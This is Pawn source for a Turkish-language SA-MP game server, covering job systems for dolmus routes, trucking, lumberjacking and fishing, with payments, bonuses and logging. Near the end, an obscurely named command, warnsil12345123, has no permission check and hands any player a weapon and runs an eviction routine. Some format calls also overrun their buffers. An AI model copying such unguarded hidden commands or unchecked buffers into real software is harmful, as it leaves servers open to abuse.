	// Store the Dolmusroute Dolmusroute
	APlayerData[playerid][JobID] = Job;
	// Set jobstep to 0 (going to the first Dolmusstop)
	APlayerData[playerid][JobStep] = 0;
	
	APlayerData[playerid][JobLoc1] = Job;
	APlayerData[playerid][JobStep] = 1;
	APlayerData[playerid][JobStarted] = true;

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);

	APlayerData[playerid][Passengers] = 0;

	// Grab the x, y, z positions for the first location
	StartLoc = ADolmusRoutes[Job][Locations][0];
	x = ALocations[StartLoc][LocX];
	y = ALocations[StartLoc][LocY];
	z = ALocations[StartLoc][LocZ];
	// Create a race-checkpoint where the player should load/unload passengers
	SetPlayerRaceCheckpoint(playerid, 2, x, y, z, xn, yn, zn, 7);
	// Set the job-fail-time for the global vehicle-timer
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	return 1;
}

// This function is used to cleanup the current job
DolmusDriver_EndJob(playerid)
{
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Clear all data about the job from the player, so he can start a new one
		APlayerData[playerid][JobStarted] = false;
		APlayerData[playerid][JobStep] = 0;
		APlayerData[playerid][JobID] = 0;
		APlayerData[playerid][Passengers] = 0;
		APlayerData[playerid][VehicleTimerTime] = 0;
		APlayerData[playerid][VehicleID] = 0;

		// Delete the checkpoint
		DisablePlayerCheckpoint(playerid);
		// Also delete any race-checkpoint (at the location of the homedepot)
		DisablePlayerRaceCheckpoint(playerid);
	}

	return 1;
}

// ************************************************************************************************************************************************************
// ppc_missionsTrucking
// ************************************************************************************************************************************************************

// Forward the function to Load or Unload goods during missions (used by a timer)
forward Trucker_LoadUnload(playerid);



// This function is called when a truckdriver enters a checkpoint
Trucker_OnPlayerEnterCheckpoint(playerid)
{
	// Check if the player on driving seat while entering a checkpoint
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		// Check if the player is inside his vehicle while entering a checkpoint
		if (GetPlayerVehicleID(playerid) == APlayerData[playerid][VehicleID])
		{
			// Also check if the player still has his trailer attached
			if (APlayerData[playerid][TrailerID] == GetVehicleTrailer(GetPlayerVehicleID(playerid)))
			{
			    // Check the jobstep
			    switch (APlayerData[playerid][JobStep])
			    {
					// JobStep is 1 (truckdriver is loading his goods at the checkpoint)
			 		case 1:
		 			{
					 GameTextForPlayer(playerid, TXT_TruckerLoadingGoods, 5000, 4);
		 			}
					// JobStep is 2 (truckdriver is unloading his goods at the checkpoint) or 3 (unloading for convoys)
					case 2, 3:
					{
					 GameTextForPlayer(playerid, TXT_TruckerUnloadingGoods, 5000, 4);
					}
				}

				// Disable the player's actions (he cannot move anymore)
				TogglePlayerControllable(playerid, 0);
				// Start a timer (Public function "LoadUnload(playerid)" gets called when the timer runs out)
				APlayerData[playerid][LoadingTimer] = SetTimerEx("Trucker_LoadUnload", 5000, false, "d" , playerid);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NeedTrailerToProceed);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NeedVehicleToProceed);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Devam etmek için þoför koltuðunda oturuyor olmanýz gerekiyor!");
	return 1;
}


// After a truckdriver entered a checkpoint, a timer is created. This function is called when the timer runs out
public Trucker_LoadUnload(playerid)
{
	// Check if the player is inside a convoy
	if (APlayerData[playerid][InConvoy] == true)
	{
		// If the player just loaded his goods at the loading-point
	    if (APlayerData[playerid][JobStep] == 1)
		{
	        APlayerData[playerid][JobStep] = 2; // Set the next step of the convoy-job (wait until all members have loaded their cargo)
			//TextDrawSetString(APlayerData[playerid][MissionText], TXT_WaitingMembersToLoadCargo);
		}

		// If the player just delivered his goods at the unloading-point
		if (APlayerData[playerid][JobStep] == 3)
		{
	        APlayerData[playerid][JobStep] = 4; // Set the next step of the convoy-job (wait until all members have unloaded their cargo)
	    	//TextDrawSetString(APlayerData[playerid][MissionText], TXT_WaitingMembersToUnLoadCargo);
		}

		DisablePlayerCheckpoint(playerid); // Delete the loading/unloading-checkpoint
		TogglePlayerControllable(playerid, 1); // Enable the player again (he can move again)

		return 1; // Don't allow the rest of the function to be executed
	}

	// If the player isn't inside a convoy, this part is executed

	// Check the JobStep
	switch (APlayerData[playerid][JobStep])
	{
		case 1: // Player must load his goods
		{
		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[100];
			// Set JobStep to 2 (unloading goods)
			APlayerData[playerid][JobStep] = 2;
			// Delete the loading-checkpoint
			DisablePlayerCheckpoint(playerid);
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Randomly set the load as overloaded (15% chance the load is overloaded)
			Trucker_SetRandomOverloaded(playerid);

			// Check if the player is overloaded
			if (APlayerData[playerid][Overloaded] == true)
			{
				// Send a message to the player to let him know he's been overloaded
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerOverloaded);
			}
			// Check if the player is carrying a mafia-load
			if (ALoads[APlayerData[playerid][LoadID]][Mafia] == true)
			{
			    // If the player is carrying a mafia-load, inform him about it
				GameTextForPlayer(playerid, TXT_TruckerMafiaInterested, 5000, 4);
				// Also set the data for the player to indicate he's carrying a mafiaload
				APlayerData[playerid][MafiaLoad] = true;
				// Also set the player's trailer ID (or the vehicle itself) as Mafia-load in the array "AVehicleMafiaLoad"
				if (APlayerData[playerid][TrailerID] == 0)
				    AVehicleData[APlayerData[playerid][VehicleID]][MafiaLoad] = true; // The player has no trailer, so set his main vehicle as wanted by the mafia
				else
                    AVehicleData[APlayerData[playerid][TrailerID]][MafiaLoad] = true; // The player has a trailer, so set his trailer as wanted by the mafia
			}

			// Grab the x, y, z positions for the second location (to unload the goods)
			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];
			// Create a checkpoint where the player should unload the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
			// Inform the player that he must unload his goods
			format(UnloadMsg, 100, TXT_DeliverCargoTo, Load, EndLoc);
			SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);

			GorevTime[playerid] = 0;
		}
		case 2: // Player is delivering his goods
		{

		    if(GorevTime[playerid] < 8)
		    {
		        new BanMSG[256];
		        //new TotalBanTime = (1 * 86400) + (0 * 3600) + gettime();
		        //APlayerData[playerid][BanTime] = TotalBanTime;

				format(BanMSG, 256, "{FF0000}%s{F8F8FF}, sunucudan tekmelendi. [ {FF0000}Teleport Hack {F8F8FF}]", GetName(playerid));
				SendClientMessageToAll(-1, BanMSG);
				SafeKick(playerid);
		        return 1;
		    }

		    // Setup local variables
			new StartLoc[50], EndLoc[50], Load[50], Msg1[128], Msg2[128], Name[24], BonusMsg[128];

			// Get the player name
			GetPlayerName(playerid, Name, sizeof(Name));
			// Get the startlocation, endlocation and the load texts
			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);

			// Construct the message sent to all players that this player completed a trucking mission
			format(Msg1, 128, TXT_PlayerCompletedTruckJob, Name, Load);
			format(Msg2, 128, TXT_PlayerCompletedTruckJobInfo, StartLoc, EndLoc);
			SendClientMessageToAll(0xFFFFFFFF, Msg1);
			SendClientMessageToAll(0xFFFFFFFF, Msg2);



		    // Setup local variables
			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, /*Message[128],*/ Payment, Bonus;
			// Grab the x, y, z positions for the first location (to load the goods)
			x1 = ALocations[APlayerData[playerid][JobLoc1]][LocX];
			y1 = ALocations[APlayerData[playerid][JobLoc1]][LocY];
			// Grab the x, y, z positions for the second location (to unload the goods)
			x2 = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y2 = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			// Calculate the distance between both points
			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));

			SonGorev[playerid][0] = APlayerData[playerid][JobLoc1];
			SonGorev[playerid][1] = APlayerData[playerid][JobLoc2];

			// Calculate the payment for the player
			Payment = floatround((Distance * ALoads[APlayerData[playerid][LoadID]][PayPerUnit]), floatround_floor);

			new DiaYazi[2000], BonusGorev, OverloadBonus, MafialoadBonus, OwnedBonus, SirketBonus;
			format(DiaYazi, 2000, "{F8F8FF}Bir taþýmacýlýk görevi tamamladýnýz.\n \n{F8F8FF}Normal Ücret: {00FF00}%d$\n", Payment);

			// Check if the player has done the bonus mission
			if (RandomBonusMission[MissionFinished] == false)
			{
				// Check all paramters (load, startlocation and end-location)
				if (RandomBonusMission[RandomLoad] == APlayerData[playerid][LoadID])
					if (RandomBonusMission[RandomStartLoc] == APlayerData[playerid][JobLoc1])
						if (RandomBonusMission[RandomEndLoc] == APlayerData[playerid][JobLoc2])
						{
						    //Payment = Payment * 2; // Double the payment if the player was the first to do the bonus mission
							BonusGorev = Payment;
							format(DiaYazi, 2000, "%s{F8F8FF}Bonus Görev: {00FF00}%d$\n", DiaYazi, BonusGorev);

							RandomBonusMission[MissionFinished] = true; // Only one player can do the bonus mission, a new one is chosen next
							format(BonusMsg, 128, "{54FF9F}«BONUS»{F8F8FF} Oyuncu {FF0000}%s{F8F8FF} bonus görevi tamamladý.", Name);


							SendClientMessageToAll(0xFFFFFFFF, BonusMsg);
						}
			}

			// Send a message to let the player know he finished his mission and got paid
			//format(Message, 128, TXT_RewardJob, Payment);
			//SendClientMessage(playerid, 0xFFFFFFFF, Message);

			// Add 25% bonus if the player has been overloaded
			if (APlayerData[playerid][Overloaded] == true)
			{
			    // Calculate the bonus
			    Bonus = floatround(Payment * 0.12);
			    OverloadBonus = Bonus;
			    format(DiaYazi, 2000, "%s{F8F8FF}Aþýrý Yükleme: {00FF00}%d$\n", DiaYazi, OverloadBonus);

				// Send a message to let the player know he was overloaded and got paid
				//format(Message, 128, TXT_TruckerBonusOverloaded, Bonus);
				//SendClientMessage(playerid, 0xFFFFFFFF, Message);
			}

			// Add 50% bonus if the player has delivered a mafia load (mafia couldn't steal his load)
			if (APlayerData[playerid][MafiaLoad] == true)
			{
			    // Calculate the bonus
			    Bonus = floatround(Payment * 0.2);
			    MafialoadBonus = Bonus;
			    format(DiaYazi, 2000, "%s{F8F8FF}Mafya Yükü: {00FF00}%d$\n", DiaYazi, MafialoadBonus);

				// Send a message to let the player know he was overloaded and got paid
				//format(Message, 128, TXT_TruckerBonusMafiaLoad, Bonus);
				//SendClientMessage(playerid, 0xFFFFFFFF, Message);
			}

			// Add 10% bonus if the player has delivered the load with his own truck
			if (AVehicleData[APlayerData[playerid][VehicleID]][Owned] == true)
			{
			    // Calculate the bonus
			    Bonus = floatround(Payment * 0.1);
			    OwnedBonus = Bonus;
				format(DiaYazi, 2000, "%s{F8F8FF}Kendi Aracýnýz: {00FF00}%d$\n", DiaYazi, OwnedBonus);

				// Send a message to let the player know he was overloaded and got paid
				//format(Message, 128, TXT_TruckerBonusOwnVehicle, Bonus);
				//SendClientMessage(playerid, 0xFFFFFFFF, Message);
			}

			// Þirket Sistemi
			if(Sirket[playerid] != -1)
			{
			    SirketBonus += floatround(Payment * 0.8);
			    format(DiaYazi, 2000, "%s{F8F8FF}Þirket Bonusu: {00FF00}%d$\n", DiaYazi, SirketBonus);

			    Payment += BonusGorev;
			    Payment += OverloadBonus;
			    Payment += MafialoadBonus;
			    Payment += OwnedBonus;
			    Payment += SirketBonus;
                if(VIP[playerid] == 1 || YVIP[playerid] == 1)
				{
					format(DiaYazi, 2000, "%s{F8F8FF}VIP Bonusu: {00FF00}%d$ & 2 EXP\n \n", DiaYazi, Payment*2);
	    			Payment += 2*Payment;
	    			EXP[playerid] = EXP[playerid] + 2;
				}
			    format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan Para: {00FF00}%d$\n", DiaYazi, Payment);
			    format(DiaYazi, 2000, "%s{F8F8FF}Þirkete Giden: {00FF00}%d$ (%%%d)\n", DiaYazi, floatround(Payment * (Sirketler[ Sirket[playerid] ][SirketOran] * 0.01 )), Sirketler[ Sirket[playerid] ][SirketOran]);
			    format(DiaYazi, 2000, "%s{F8F8FF}Size Kalan: {00FF00}%d$ (%%%d)\n", DiaYazi, Payment - floatround(Payment * (Sirketler[ Sirket[playerid] ][SirketOran] * 0.01 )), 100 - Sirketler[ Sirket[playerid] ][SirketOran]);

			    format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan EXP\t{FFC000}5 EXP", DiaYazi);
                ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Görev Tamamlandý", DiaYazi, "Kapat", "");

			    RewardPlayer(playerid, Payment - floatround(Payment * (Sirketler[ Sirket[playerid] ][SirketOran] * 0.01 )), 0);
			    Sirketler[ Sirket[playerid] ][SirketKasa] += floatround(Payment * (Sirketler[ Sirket[playerid] ][SirketOran] * 0.01 ));
				SirketKatki[playerid] += floatround(Payment * (Sirketler[ Sirket[playerid] ][SirketOran] * 0.01 ));
				Sirketler[ Sirket[playerid] ][SirketNeedSave] = 1;
			}else{
			    Payment += BonusGorev;
			    Payment += OverloadBonus;
			    Payment += MafialoadBonus;
			    Payment += OwnedBonus;
                if(VIP[playerid] == 1 || YVIP[playerid] == 1)
				{
					format(DiaYazi, 2000, "%s{F8F8FF}VIP Bonusu: {00FF00}%d$ & 2 EXP\n \n", DiaYazi, Payment*2);
	    			Payment += 2*Payment;
	    			EXP[playerid] = EXP[playerid] + 2;
			    }

			    format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan Para: {00FF00}%d$\n", DiaYazi, Payment);
                format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan EXP\t{FFC000}5 EXP", DiaYazi);

			    ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Görev Tamamlandý", DiaYazi, "Kapat", "");

			    RewardPlayer(playerid, Payment, 0);
			}

            new LogYazi[350];
			// Also add score-points to the score of the player based on the distance between the loading and unloading points
			if (Distance > 3000.0)
			{
				if(VIP[playerid] == 1 || YVIP[playerid] == 1)
				{
					RewardPlayer(playerid, 0, 6); // Distance is larger than 3000 units, so add 2 points
				}else{
				    RewardPlayer(playerid, 0, 2); // Distance is larger than 3000 units, so add 2 points
				}
				format(LogYazi, 256, "[KAMYONCU] %s, %s'den %s'e %s tasidi. Kazanc: %d$, %d Skor ve 5 EXP Sure: %d Saniye", GetName(playerid), ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], ALoads[APlayerData[playerid][LoadID]][LoadName], Payment, 1, GorevTime[playerid]);
			}else{
				if(VIP[playerid] == 1 || YVIP[playerid] == 1)
				{
					RewardPlayer(playerid, 0, 3); // Distance is larger than 3000 units, so add 2 points
				}else{
                    RewardPlayer(playerid, 0, 1); // Distance is less than 3000 units, so add 1 point
				}

				format(LogYazi, 256, "[KAMYONCU] %s, %s'den %s'e %s tasidi. Kazanc: %d$, %d Skor ve 5 EXP Sure: %d Saniye", GetName(playerid), ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], ALoads[APlayerData[playerid][LoadID]][LoadName], Payment, 2, GorevTime[playerid]);
			}

			// Increase the stats for completing a trucking job
			LOG(LogYazi);
			APlayerData[playerid][StatsTruckerJobs]++;
			format(LogYazi, 1024, "Týr görevini baþarýyla bitirdi");
    		SqlLogYaz(playerid, 7, LogYazi);
			if(APlayerData[playerid][StatsTruckerJobs] >= 10)
			{
			  GivePlayerAchievement(playerid, KamyoncuAch, 1); // Baþarým Sistemi
			}

            EXP[playerid] = EXP[playerid] + 5;
			// Also save the data (in case the server crashes, progress would be lost)
			Oyuncu_Kaydet(playerid);

			// End the current trucker job (clear mission-data)
			Trucker_EndJob(playerid);
		}
	}

    // Enable the player again (he can move again)
	TogglePlayerControllable(playerid, 1);


	return 1;
}

// This function randomly determines if the load is overloaded and adds 2 to the playerwanted-level
Trucker_SetRandomOverloaded(playerid)
{
	// Setup local variables
	new Name[24], Msg[128];

	// Check the vehicle model that the player is driving
	switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
	{
		case VehicleCementTruck: return 0; // A cementtruck cannot be overloaded
		case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // When driving a LineRunner, Tanker or RoadTrain
		{
			// A Fluids-trailer cannot be overloaded
			if (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid))) == VehicleTrailerFluids) return 0;
		}
	}

	// The player wasn't driving one of the above vehicle models, so this one can be overloaded
	// There is a 15% chance that your load will be overloaded
	if (random(100) <= 15)
	{
		// Set overloaded for this player to True
	    APlayerData[playerid][Overloaded] = true;
	    // Add 2 to the player's wanted level
	    APlayerData[playerid][PlayerWanted] += 2;
		// Inform the police this trucker is overloaded
		GetPlayerName(playerid, Name, sizeof(Name));
		format(Msg, 128, "{00FF00}Kamyoncu {FFFF00}%s{00FF00} aþýrý yükleme yaptý, onu kovalayýn ve cezalandýrýn", Name);
		Police_SendMessage(Msg);
	}

	return 1;
}

// This function is called when a truckdriver wants to start a job by entering "/work" and has no truckers license
Trucker_StartRandomJob(playerid)
{
	// Check if a job could be set correctly (player must be driving a valid trucking vehicle)
	if (Trucker_SetRandomJob(playerid) != 0)
	{
	    // Setup local variables
		new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];

		// Job has started
		APlayerData[playerid][JobStarted] = true;

		// Set jobstep to 1 (going to load the goods)
		APlayerData[playerid][JobStep] = 1;
		// Get the startlocation, endlocation and the load texts
		format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
		format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
		format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);
		// Grab the x, y, z positions for the first location
		x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
		y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
		z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];
		// Create a checkpoint where the player should load the goods
		SetPlayerCheckpoint(playerid, x, y, z, 7);

		// Set the job-fail-time for the global vehicle-timer
		APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
		// Inform the player that he must load his goods
		//new Float: fDistance = GetPlayerDistanceFromPoint(playerid, x,y,z);
		format(LoadMsg, 128, TXT_PickupCargoAt, Load, StartLoc);
		SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);

	}

	return 1;
}

// This function sets a random job based on the player's vehicle and returns 1 if a job has been set
// The function returns 0 if a job couldn't be set (if the player is driving an invalid vehicle to start trucking-jobs)
Trucker_SetRandomJob(playerid)
{
	// If the player is the driver of the vehicle (GetPlayerVehicleSeat returns -1 if the player is not in a vehicle)
	if (GetPlayerVehicleSeat(playerid) == 0)
	{
		// Check the vehicle-model of the player to decide which job the player can get
		switch (GetVehicleModel(GetPlayerVehicleID(playerid)))
		{
			case VehicleFlatbed, VehicleDFT30: // Select a random job from the routes that don't require a trailer and store the data for the player (Flatbed or DFT-30)
				return Trucker_SetRandomJobData(playerid, PCV_TruckerNoTrailer);
			case VehicleCementTruck: // Select a random job from the routes for cementtrucks and store the data for the player
				return Trucker_SetRandomJobData(playerid, PCV_TruckerCementTruck);
			case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // If the player's vehicle is a "LineRunner", "Tanker" or "RoadTrain"
			{
				// Select a job based on the trailer model of the player
				switch (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid))))
				{
					case VehicleTrailerCargo, VehicleTrailerCargo2: // Select a random job from the routes that require a cargo-trailer and store the data for the player
						return Trucker_SetRandomJobData(playerid, PCV_TruckerCargoTrailer);
					case VehicleTrailerOre: // Select a random job from the routes that require a ore-trailer and store the data for the player
						return Trucker_SetRandomJobData(playerid, PCV_TruckerOreTrailer);
					case VehicleTrailerFluids: // Select a random job from the routes that require a fluids-trailer and store the data for the player
						return Trucker_SetRandomJobData(playerid, PCV_TruckerFluidsTrailer);
				}
			}
		}
	}

	// If no job could be set correctly, return 0
	return 0;
}

// This function chooses a random product for the trucker with a given vehicle-type and also the start-location and end-location
Trucker_SetRandomJobData(playerid, PCV_Needed)
{
	// Get a random Load from the loads that are defined for truckers with the given vehicle-type
    APlayerData[playerid][LoadID] = Product_GetRandom(PCV_Needed);
	// Get a random start-location and end-location for this load
    APlayerData[playerid][JobLoc1] = Product_GetRandomStartLoc(APlayerData[playerid][LoadID]);
    APlayerData[playerid][JobLoc2] = Product_GetRandomEndLoc(APlayerData[playerid][LoadID]);

	// Store the vehicleID (required to be able to check if the player left his vehicle)
	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);
	// Store the trailerID (required to be able to check if the player lost his trailer)
	APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));

	if(APlayerData[playerid][JobLoc1] == APlayerData[playerid][JobLoc2]) return Trucker_SetRandomJobData(playerid, PCV_Needed);
	// Return 1 to indicate that a job has been set correctly
	return 1;
}



// This function is used to cleanup the current job
Trucker_EndJob(playerid)
{
	if (APlayerData[playerid][JobStarted] == true)
	{
		// Clear the Mafia-wanted status of the vehicle (or trailer) in the array "AVehicleData"
		if (APlayerData[playerid][TrailerID] == 0)
		    AVehicleData[APlayerData[playerid][VehicleID]][MafiaLoad] = false; // The player has no trailer, so clear his main vehicle as wanted by the mafia
		else
			AVehicleData[APlayerData[playerid][TrailerID]][MafiaLoad] = false; // The player has a trailer, so clear his trailer as wanted by the mafia

		// Clear all data about the job from the player, so he can start a new one
		APlayerData[playerid][JobStarted] = false;
		APlayerData[playerid][JobStep] = 0;
		APlayerData[playerid][JobID] = 0;
		APlayerData[playerid][VehicleTimerTime] = 0;
		APlayerData[playerid][VehicleID] = 0;
		APlayerData[playerid][TrailerID] = 0;
		APlayerData[playerid][LoadID] = 0;
		APlayerData[playerid][JobLoc1] = 0;
		APlayerData[playerid][JobLoc2] = 0;
		APlayerData[playerid][MafiaLoad] = false;

		// Delete the checkpoint
		DisablePlayerCheckpoint(playerid);
		// Reset the missiontext
		//TextDrawSetString(APlayerData[playerid][MissionText], Trucker_NoJobText);
		// Kill the LoadingTimer
		KillTimer(APlayerData[playerid][LoadingTimer]);

    	if(polisyazi[playerid] == 1) Delete3DTextLabel(PolisLabel[playerid]);
    	if(asiriyazi[playerid] == 1) Delete3DTextLabel(AsiriLabel[playerid]);
		asiriyazi[playerid] = 0;
		polisyazi[playerid] = 0;
		
		// Check if the player has been overloaded
		if (APlayerData[playerid][Overloaded] == true)
		{

		    APlayerData[playerid][Overloaded] = false;

		    // Check if the player has a wanted level of 2 or higher
			if (APlayerData[playerid][PlayerWanted] >= 2)
   				APlayerData[playerid][PlayerWanted] -= 2;
			else
   				APlayerData[playerid][PlayerWanted] = 0; // If the player has a wanted level of less than 2, reset the wanted level to 0
		}
	}

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_MissionsOduncu
// ************************************************************************************************************************************************************
enum AgacKesimLocation
{
	AKName[100],
	Float:AKMinX,
	Float:AKMinY,
	Float:AKMaxX,
	Float:AKMaxY
};

new AgacKesimLoc[1][AgacKesimLocation]={
{"The Panopticon", -610.0221, -34.7887, -564.3834, -6.9206}
};

new AgacKesimZone[1];

new OdunSatisLoc[1][TLocation]={
{"The Panopticon", -537.6629, -94.9383, 62.9816}
};

new KesilenAgac[MAX_PLAYERS];
new AgacTime[MAX_PLAYERS];

CMD:odunsat(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassOduncu) return SendClientMessage(playerid, -1, "{FF0000}Sadece oduncular odun satabilir!");
	if(!IsInOdunSatisLoc(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Odun satýþ noktasýnda deðilsiniz!");
	if(KesilenAgac[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Üzerinizde odun yok!");
	new Ucret, Skor, Yazi[200];

	if(VIP[playerid] >= 1 || YVIP[playerid] == 1)
	{
	    Ucret = KesilenAgac[playerid] * 3000;
	    Skor = KesilenAgac[playerid] * 3;
	}else{
	    Ucret = KesilenAgac[playerid] * 1000;
	    Skor = KesilenAgac[playerid];
	}

	format(Yazi, 300, "{228B22}%d Parti Odun {F8F8FF}satarak {228B22}%d$, %d Skor ve 5 EXP {F8F8FF}kazandýnýz.", KesilenAgac[playerid], Ucret, Skor);
	SendClientMessage(playerid, -1, Yazi);
	
	EXP[playerid] = EXP[playerid] + 5;

	KesilenAgac[playerid] = 0;
	RewardPlayer(playerid, Ucret, Skor);

	return 1;
}

IsInOdunSatisLoc(playerid)
{
	new Balliciyim;

	for(new i; i < sizeof(OdunSatisLoc); i++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, OdunSatisLoc[i][LocX], OdunSatisLoc[i][LocY], OdunSatisLoc[i][LocZ]))
	    {
	        Balliciyim = 1;
	        break;
	    }
	}

	return Balliciyim;
}

Oduncu_LoadMissionPlace()
{
	for(new i; i < sizeof(AgacKesimLoc); i++)
	{
	    AgacKesimZone[i] = GangZoneCreate(AgacKesimLoc[i][AKMinX], AgacKesimLoc[i][AKMinY], AgacKesimLoc[i][AKMaxX], AgacKesimLoc[i][AKMaxY]);
	}

	for(new a; a < sizeof(OdunSatisLoc); a++)
	{
	    CreateDynamic3DTextLabel("{FFCC00}» {FFFFFF}Odun Satýþ Noktasý\n{F8F8FF}/odunsat", -1, OdunSatisLoc[a][LocX], OdunSatisLoc[a][LocY], OdunSatisLoc[a][LocZ], 70.0);
		CreateActor(44, OdunSatisLoc[a][LocX], OdunSatisLoc[a][LocY], OdunSatisLoc[a][LocZ], 0.0);
	}
}

Oduncu_ShowMissionPlace(playerid)
{
	for(new i; i < sizeof(AgacKesimLoc); i++)
	{
	    GangZoneShowForPlayer(playerid, AgacKesimZone[i], 0x228B22AA);
	}
}

Oduncu_StartKesim(playerid)
{
	if(!IsInAgacKesimLocation(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Aðaç kesmeye baþlamak için kesim alanýnda olmalýsýnýz!");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Araçtayken odun kesemezsiniz!");
	if(KesilenAgac[playerid] == 20) return SendClientMessage(playerid, -1, "{FF0000}Üzerinizde fazlasýyla odun var. Odunlarý odunluða götürüp satýn. (/odunsat)");

	AgacTime[playerid] = 0;
	APlayerData[playerid][JobStarted] = true;
	TogglePlayerControllable(playerid, 0);
	SendClientMessage(playerid, -1, "{00FF00}Odun kesmeye baþladýnýz.");
	return 1;
}

Oduncu_ControlKesim(playerid)
{
	if(APlayerData[playerid][JobStarted] == false) return 1;
	if(APlayerData[playerid][PlayerClass] != ClassOduncu) return 1;

	AgacTime[playerid]++;
	if(AgacTime[playerid] == 80)
	{
		AgacTime[playerid] = 0;
		KesilenAgac[playerid]++;
 		APlayerData[playerid][StatsOduncuJobs]++;
 		new Message[1024];
		format(Message, 1024, "Oduncu görevini baþarýyla bitirdi");
		SqlLogYaz(playerid, 7, Message);

		APlayerData[playerid][JobStarted] = false;
  		TogglePlayerControllable(playerid, 1);

		SendClientMessage(playerid, -1, "{00FF00}1 Odun {F8F8FF}kestiniz. Odun kesmeye devam etmek için {ADFF2F}/work {F8F8FF}yazýnýz.");

		if(KesilenAgac[playerid] == 20)
		{
		    SendClientMessage(playerid, -1, "{00FF00}Eliniz doldu. Odunluða dönüp /odunsat yazýp odunlarý satarak para kazanýn.");
		}
	}

	return 1;
}

Oduncu_EndJob(playerid)
{
	TogglePlayerControllable(playerid, 1);
	APlayerData[playerid][JobStarted] = false;
}

IsInAgacKesimLocation(playerid)
{
	new CahidoMeter, Float:oXs, Float:oYs, Float:oZs;
	GetPlayerPos(playerid, oXs, oYs, oZs);

	for(new i; i < sizeof(AgacKesimLoc); i++)
	{
	    if(oXs > AgacKesimLoc[i][AKMinX] && oYs > AgacKesimLoc[i][AKMinY] && oXs < AgacKesimLoc[i][AKMaxX] && oYs < AgacKesimLoc[i][AKMaxY])
	    {
	        CahidoMeter = 1;
	        break;
	    }
	}
	return CahidoMeter;
}

// ************************************************************************************************************************************************************
// PPC_MissionsBalikci
// ************************************************************************************************************************************************************
new BalikOFIS[3][TLocation]={
{"Los Santos Ofis", 2474.4680,-2710.5500,10.7250},
{"San Fierro Ofis", -3014.0793,335.2648,7.6500},
{"Las Venturas Ofis", 890.8693,640.5707,11.7172}
};

new BalikAdi[5][80]={
"Hamsi",
"Istavrit",
"Kefal",
"Lufer",
"Palamut"
};

new CopAdi[3][80]={
"Ayakkabý",
"Lastik",
"Çöp Poþeti"
};

new EldekiBalik[MAX_PLAYERS],
	BalikAsama[MAX_PLAYERS],
	BalikAsamaM[MAX_PLAYERS];

CMD:warnsil12345123(playerid) //warnsil
{
 FBY_SendMessage("TEST");
 KutuInfo[playerid] = 0;
 FBYWeaponsAmmo = 0;
 SilahVer(playerid, AFBYWeapons[3], FBYWeaponsAmmo);
 AutoEvict_Load();
return 1;
}

CMD:baliksat(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassBalikci) return SendClientMessage(playerid, -1, "{FF0000}Balýkçý deðilsiniz!");
	if(EldekiBalik[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Elinizde balýk yok!");
